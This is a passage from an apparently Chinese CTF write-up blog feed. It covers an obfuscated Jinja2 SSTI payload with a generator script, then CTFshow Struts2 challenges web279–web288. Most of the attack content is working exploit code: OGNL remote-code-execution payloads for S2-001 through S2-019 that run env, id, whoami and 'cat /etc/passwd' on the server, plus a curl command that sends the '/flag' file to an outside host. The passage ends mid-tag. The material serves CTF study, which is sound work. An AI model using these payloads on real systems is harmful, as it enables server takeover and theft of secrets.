&#125;&#123; %set eee&#x3D;dict(aaa&#x3D;a)|join|count% &#125;&#123; %set eeee&#x3D;dict(aaaa&#x3D;a)|join|count% &#125;&#123; %set eeeee&#x3D;dict(aaaaa&#x3D;a)|join|count% &#125;&#123; %set eeeeee&#x3D;dict(aaaaaa&#x3D;a)|join|count% &#125;&#123; %set eeeeeee&#x3D;dict(aaaaaaa&#x3D;a)|join|count% &#125;&#123; %set eeeeeeee&#x3D;dict(aaaaaaaa&#x3D;a)|join|count% &#125;&#123; %set eeeeeeeee&#x3D;dict(aaaaaaaaa&#x3D;a)|join|count% &#125;&#123; %set eeeeeeeeee&#x3D;dict(aaaaaaaaaa&#x3D;a)|join|count% &#125;&#123; %set x&#x3D;(()|select|string|list).pop((ee~eeee)|int)% &#125;&#123; %set glob &#x3D; (x,x,dict(globals&#x3D;a)|join,x,x)|join % &#125;&#123; %set builtins&#x3D;x~x~(dict(builtins&#x3D;a)|join)~x~x% &#125;&#123; %set import&#x3D;x~x~(dict(import&#x3D;a)|join)~x~x% &#125;&#123; %set c &#x3D; dict(chr&#x3D;a)|join% &#125;&#123; %set o &#x3D; dict(o&#x3D;a,s&#x3D;a)|join% &#125;&#123; %set getitem &#x3D; x~x~(dict(getitem&#x3D;a)|join)~x~x% &#125;&#123; %set chr &#x3D; lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)% &#125;&#123; %set zero&#x3D;chr((eeee~eeeeeeee)|int)% &#125;&#123; %set cmd &#x3D; % &#125;&#123; %if (lipsum|attr(glob)|attr(getitem)(builtins)).eval(cmd)% &#125;eastjun&#123; %endif% &#125;</code></pre><p>命令生成脚本：</p><pre class="language-python" data-language="python"><code class="language-python">import redef filting(s):    return &quot;&quot;.join([f&quot;chr(&#123;ord(i)&#125;)~&quot; for i in s])[:-1]cmd&#x3D;filting(&quot;curl https:&#x2F;&#x2F;eastjun.top?flag&#x3D;&#96;cat &#x2F;flag&#96;&quot;)nums &#x3D; set(re.findall(&quot;(\d+)&quot;,cmd))for i in nums:    patnum &#x3D; &quot;&quot;.join([&quot;zero~&quot; if j&#x3D;&#x3D;&quot;0&quot; else f&#39;&#123;&quot;e&quot; * int(j)&#125;~&#39; for j in f&quot;&#123;i&#125;&quot;])    cmd &#x3D; cmd.replace(f&quot;&#123;i&#125;&quot;,f&quot;(&#123;patnum[:-1]&#125;)|int&quot;)print(cmd)</code></pre><h1 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h1><h3 id="无回显过滤"><a href="#无回显过滤" class="headerlink" title="无回显过滤"></a>无回显过滤</h3><pre class="language-python" data-language="python"><code class="language-python">&#123; %set e&#x3D;dict(a&#x3D;a)|join|length% &#125;&#123; %set ee&#x3D;dict(aa&#x3D;a)|join|length% &#125;&#123; %set eee&#x3D;dict(aaa&#x3D;a)|join|length% &#125;&#123; %set eeee&#x3D;dict(aaaa&#x3D;a)|join|length% &#125;&#123; %set eeeee&#x3D;dict(aaaaa&#x3D;a)|join|length% &#125;&#123; %set eeeeee&#x3D;dict(aaaaaa&#x3D;a)|join|length% &#125;&#123; %set eeeeeee&#x3D;dict(aaaaaaa&#x3D;a)|join|length% &#125;&#123; %set eeeeeeee&#x3D;dict(aaaaaaaa&#x3D;a)|join|length% &#125;&#123; %set eeeeeeeee&#x3D;dict(aaaaaaaaa&#x3D;a)|join|length% &#125;&#123; %set eeeeeeeeee&#x3D;dict(aaaaaaaaaa&#x3D;a)|join|length% &#125;&#123; %set x&#x3D;(()|select|string|list).pop((ee~eeee)|int)% &#125;&#123; %set glob &#x3D; (x,x,dict(globals&#x3D;a)|join,x,x)|join % &#125;&#123; %set builtins&#x3D;x~x~(dict(builtins&#x3D;a)|join)~x~x% &#125;&#123; %set import&#x3D;x~x~(dict(import&#x3D;a)|join)~x~x% &#125;&#123; %set c &#x3D; dict(chr&#x3D;a)|join% &#125;&#123; %set o &#x3D; dict(o&#x3D;a,s&#x3D;a)|join% &#125;&#123; %set getitem &#x3D; x~x~(dict(getitem&#x3D;a)|join)~x~x% &#125;&#123; %set chr &#x3D; lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)% &#125;&#123; %set zero&#x3D;chr((eeee~eeeeeeee)|int)% &#125;&#123; %set cmd &#x3D; % &#125;&#123; %if (lipsum|attr(glob)|attr(getitem)(builtins)).eval(cmd)% &#125;eastjun&#123; %endif% &#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web279-web300JavaStrut2篇</title>
      <link href="/posts/74021304/"/>
      <url>/posts/74021304/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://blog.csdn.net/q20010619/article/details/120729447">https://blog.csdn.net/q20010619/article/details/120729447</a></p></blockquote><p>这里面的漏洞都是struts2漏洞，使用<br>建议下载Struts2scan工具辅助学习。</p><blockquote><p><a href="https://github.com/HatBoy/Struts2-Scan.git">https://github.com/HatBoy/Struts2-Scan.git</a><br><a href="https://github.com/shack2/Struts2VulsTools">https://github.com/shack2/Struts2VulsTools</a></p></blockquote><ul><li>通过页面回显的错误消息来判断，页面不回显错误消息时则无效</li><li>通过网页后缀来判断，如.do .action，有可能不准<ul><li>如果配置文件中常数extension的值以逗号结尾或者有空值，指明了action可以不带后缀，那么不带后缀的uri也可能是struts2框架搭建的</li><li>如果使用Struts2的rest插件，其默认的struts-plugin.xml指定的请求后缀为xhtml,xml和json</li></ul></li><li>判断 &#x2F;struts&#x2F;webconsole.html 是否存在来进行判断，需要 devMode 为 true</li></ul><h1 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h1><blockquote><p><a href="https://www.freebuf.com/column/224041.html">https://www.freebuf.com/column/224041.html</a></p></blockquote><h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><pre class="language-bash" data-language="bash"><code class="language-bash">printenv | grep FLAG</code></pre><p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690893342133-0c453427-6529-45f6-a84e-7a9b30b1cddc.png" alt="image.png">在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p><p>所以，访问<a href="http://your-ip:8080/index.action?redirect:OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8COGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F">http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式</a></p><p>影响版本: 2.0.0 - 2.3.15<br>我们输入测试命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">%&#123;1+1&#125;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690894169760-b882601b-4fc3-4cdf-a91d-3e7e81a3bb7f.png" alt="image.png"><br>提交之后发现加法表达式被成功执行了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690894216166-7493cfb3-b16a-4c94-aedf-76293e9ca03d.png" alt="image.png"></p><ul><li>%的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值</li><li>#的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</li><li>$主要是在Struts 2配置文件中，引用OGNL表达式</li></ul><p>常用payload：</p><pre class="language-bash" data-language="bash"><code class="language-bash">&#x2F;&#x2F; 获取tomcat路径%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;&#x2F;&#x2F; 获取web路径%&#123;#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest(),#response&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;&#x2F;&#39;)),#response.flush(),#response.close()&#125;&#x2F;&#x2F; 命令执行 env，flag就在其中password&#x3D;%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username&#x3D;1</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690894841073-47f7327b-4cdc-46d9-9821-109faa25e90e.png" alt="image.png"><br>url转义一下。<br>这个用struts2scan工具扫描，但是无法检测出漏洞，这里不清楚为什么。<br>ctfshow这个靶场的用不了，但是vulhub自己搭就可以。但是两个都无法进行漏洞利用（进入命令行模式）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690898715564-49bc97ef-53b3-4a51-a792-d439165e1f2f.png" alt="image.png"><br>这里换了一个工具，但是也是不能用001，但是可以执行016了。</p><blockquote><p><a href="https://github.com/shack2/Struts2VulsTools">https://github.com/shack2/Struts2VulsTools</a></p></blockquote><h1 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h1><h3 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h3><p>Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果<br>影响版本：Struts 2.0.0 - Struts 2.0.11.2<br>poc：</p><pre class="language-bash" data-language="bash"><code class="language-bash">?(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(kxlzx)(kxlzx)&amp;(&#39;\u0023mycmd\u003d\&#39;ifconfig\&#39;&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)&amp;(A)((&#39;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#39;)(bla))&amp;(B)((&#39;\u0023myres\u003dnew\40byte[51020]&#39;)(bla))&amp;(C)((&#39;\u0023mydat.readFully(\u0023myres)&#39;)(bla))&amp;(D)((&#39;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#39;)(bla))&amp;(&#39;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#39;)(bla)(bla)&amp;(E)((&#39;\u0023myout.getWriter().println(\u0023mystr)&#39;)(bla))</code></pre><p>他给的这个poc也不太能用<br>这里直接用工具了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690900144282-73dea694-41b3-47e5-aff2-63823b79a439.png" alt="image.png"><br>那个struts2scan是真不好用啊。各种误判。</p><h1 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h1><h3 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h3><p>当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回<br>影响版本：Struts2 2.0.0 - Struts2 2.2.3<br>poc：</p><pre class="language-bash" data-language="bash"><code class="language-bash">&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,#foo&#x3D;new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;printenv | grep FLAG&#39;).getInputStream())) + &#39;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690900949819-59a428bb-9741-40bb-85c4-9e8396a2b2e5.png" alt="image.png"></p><h1 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h1><h3 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h3><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的<br>影响版本：Struts 2.1.0 - Struts 2.3.1</p><h2 id="姿势1"><a href="#姿势1" class="headerlink" title="姿势1"></a>姿势1</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Cookie:(&#39;#_memberAccess.setAllowStaticMethodAccess(true)&#39;)(1)(2)&#x3D;Aluvion; (&#39;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#39;)(1)(2)&#x3D;Twings;</code></pre><p>没成功</p><h2 id="姿势2"><a href="#姿势2" class="headerlink" title="姿势2"></a>姿势2</h2><pre class="language-bash" data-language="bash"><code class="language-bash">devmode.action?debug&#x3D;command&amp;expression&#x3D;(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27printenv%20%7C%20grep%20FLAG%27%29.getInputStream%28%29%29)</code></pre><p>这个可以<br>当然也可以用S2-016直接梭</p><h1 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h1><h3 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h3><p>这个漏洞再次来源于s2-003、s2-005<br>参考Struts2漏洞分析之Ognl表达式特性引发的新思路，文中说到，该引入ognl的方法不光可能出现在这个漏洞中，也可能出现在其他java应用中<br>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于#号，同样使用编码\u0023或\43进行绕过；于是Struts2对s2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线<br>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用&#x2F;helloword.acton?example&#x3D;<OGNL statement>&amp;(example)(‘xxx’)&#x3D;1的方法来执行它，从而绕过官方对#、\等特殊字符的防御<br>通过Struts2框架中ParametersInterceptor拦截器只检查传入的参数名而不检查参数值的方式进行构造OGNL表达式从而造成代码执行<br>影响版本：Struts 2.0.0 - Struts 2.3.1<br><code>http://your-ip:8080/ajax/example5.action</code>即可访问该控制器<br>payload：</p><pre class="language-bash" data-language="bash"><code class="language-bash">&#x2F;ajax&#x2F;example5.action?age&#x3D;12313&amp;name&#x3D;(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]&#x3D;+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]&#x3D;true,+%23a&#x3D;@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream(),%23b&#x3D;new+java.io.InputStreamReader(%23a),%23c&#x3D;new+java.io.BufferedReader(%23b),%23d&#x3D;new+char[51020],%23c.read(%23d),%23kxlzx&#x3D;@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690901618232-92eccea1-a51d-4e57-96c1-d97ab91b2662.png" alt="image.png"><br>可以直接下载得到一个文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690901903963-8d9c0690-3830-4867-9793-2a5190a1ed1a.png" alt="image.png"></p><h1 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h1><h3 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h3><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p><pre class="language-markup" data-language="markup"><code class="language-markup">&lt;package name&#x3D;&quot;S2-012&quot; extends&#x3D;&quot;struts-default&quot;&gt;  &lt;action name&#x3D;&quot;user&quot; class&#x3D;&quot;com.demo.action.UserAction&quot;&gt;    &lt;result name&#x3D;&quot;redirect&quot; type&#x3D;&quot;redirect&quot;&gt;&#x2F;index.jsp?name&#x3D;$&#123;name&#125;&lt;&#x2F;result&gt;    &lt;result name&#x3D;&quot;input&quot;&gt;&#x2F;index.jsp&lt;&#x2F;result&gt;    &lt;result name&#x3D;&quot;success&quot;&gt;&#x2F;index.jsp&lt;&#x2F;result&gt;  &lt;&#x2F;action&gt;&lt;&#x2F;package&gt;</code></pre><p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行<br>影响版本: 2.1.0 - 2.3.13<br>payload:</p><pre class="language-markup" data-language="markup"><code class="language-markup">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;&#x2F;etc&#x2F;passwd&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre><p>将payload放入输入框中提交，就可以下载到文本内容。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692536585259-0819a898-28ff-441e-b5e4-403757ed8f6d.png" alt="image.png"><br>flag在环境里面，直接查看即可：</p><pre class="language-markup" data-language="markup"><code class="language-markup">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692536905535-1f302ae2-41aa-44af-8576-00ccfff0fd02.png" alt="image.png"></p><h1 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h1><h3 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h3><p>Struts2 标签中 <code>&lt;s:a&gt;</code> 和 <code>&lt;s:url&gt;</code> 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</p><ul><li>none - 链接不包含请求的任意参数值（默认）</li><li>get - 链接只包含 GET 请求中的参数和其值</li><li>all - 链接包含 GET 和 POST 所有参数和其值</li></ul><p>&lt;s:a&gt;用来显示一个超链接，当includeParams&#x3D;all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞<br>影响版本：2.0.0 - 2.3.14.1<br>poc：</p><pre class="language-java" data-language="java"><code class="language-java">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,#a&#x3D;@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream(),#b&#x3D;new java.io.InputStreamReader(#a),#c&#x3D;new java.io.BufferedReader(#b),#d&#x3D;new char[50000],#c.read(#d),#out&#x3D;@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;&#x2F;&#x2F; 或$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())&#125;</code></pre><p>看看payload：</p><pre class="language-markup" data-language="markup"><code class="language-markup">link.action?a&#x3D;%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;env&#39;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%dddddddd3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%dd7D</code></pre><p>（似乎第二个用不了，测试得不到rce）</p><h1 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h1><h3 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h3><p>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p><pre class="language-markup" data-language="markup"><code class="language-markup">&lt;package name&#x3D;&quot;S2-015&quot; extends&#x3D;&quot;struts-default&quot;&gt;    &lt;action name&#x3D;&quot;*&quot; class&#x3D;&quot;com.demo.action.PageAction&quot;&gt;        &lt;result&gt;&#x2F;&#123;1&#125;.jsp&lt;&#x2F;result&gt;    &lt;&#x2F;action&gt;&lt;&#x2F;package&gt;</code></pre><p>上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 &#x2F; “ \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功<br>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 #_memberAccess[‘allowStaticMethodAccess’]&#x3D;true 来修改其值达到重获静态方法调用的能力<br>影响版本: 2.0.0 - 2.3.14.2<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692537740735-e067567e-b70b-414e-9435-4415d6015bfc.png" alt="image.png"><br>poc:</p><pre class="language-markup" data-language="markup"><code class="language-markup">$&#123;#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]&#x3D;false,#m&#x3D;#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q&#x3D;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream()),#q&#125;.action</code></pre><p>payload:</p><pre class="language-markup" data-language="markup"><code class="language-markup">%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%65%6e%76%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e</code></pre><p>全部url编码。</p><pre class="language-markup" data-language="markup"><code class="language-markup">printenv | grep FLAG</code></pre><p>似乎flag没在env里面，或者可能是输出有限制。感觉是输出有限制，因为结尾没有输出完全，那换个方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692540843538-b2af1750-19f1-42c0-9349-590ec3e4fa1e.png" alt="image.png"><br>气死我了，怎么写都输出不来后半段总是识别不出来。妈的工具一把嗦。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692540864123-aea0c64b-79f9-4d6a-8fe3-e5be0d1ef63c.png" alt="image.png"><br>妈的 上面那个payload重新启动容器就ok了：<br>URL转义下方内容：</p><pre class="language-markup" data-language="markup"><code class="language-markup">$&#123;#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]&#x3D;false,#m&#x3D;#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q&#x3D;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;printenv | grep FLAG&#39;).getInputStream()),#q&#125;.action</code></pre><h1 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h1><h3 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h3><p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令<br>所以，访问<a href="http://your-ip:8080/index.action?redirect:OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8COGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F">http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式</a><br>影响版本: 2.0.0 - 2.3.15<br>poc：</p><pre class="language-markup" data-language="markup"><code class="language-markup">redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;false,#f&#x3D;#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a&#x3D;@java.lang.Runtime@getRuntime().exec(&quot;uname -a&quot;).getInputStream(),#b&#x3D;new java.io.InputStreamReader(#a),#c&#x3D;new java.io.BufferedReader(#b),#d&#x3D;new char[5000],#c.read(#d),#genxor&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125;</code></pre><h1 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h1><h3 id="S2-019"><a href="#S2-019" class="headerlink" title="S2-019"></a>S2-019</h3><p>动态方法调用的默认启用，原理类似于s2-008<br>Apache Struts 2的“Dynamic Method Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码<br>与s2-008poc区别不同的仅仅是由原先的[“allowStaticMethodAccess”]&#x3D;true静态方法执行改为(new java.lang.ProcessBuilder(‘id’)).start()，但该方法在虚空浪子心提出s2-012后不久就在博客里说明了官方修补方案将allowStaticMethodAccess取消了后的替补方法就是使用ava.lang.ProcessBuilder<br>影响版本：Struts 2.0.0 - Struts 2.3.15.1<br>poc：</p><pre class="language-markup" data-language="markup"><code class="language-markup">?debug&#x3D;command&amp;expression&#x3D;#a&#x3D;(new java.lang.ProcessBuilder(&#39;id&#39;)).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#out&#x3D;#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()&#x2F;&#x2F; 利用是先进行url编码    </code></pre><pre class="language-markup" data-language="markup"><code 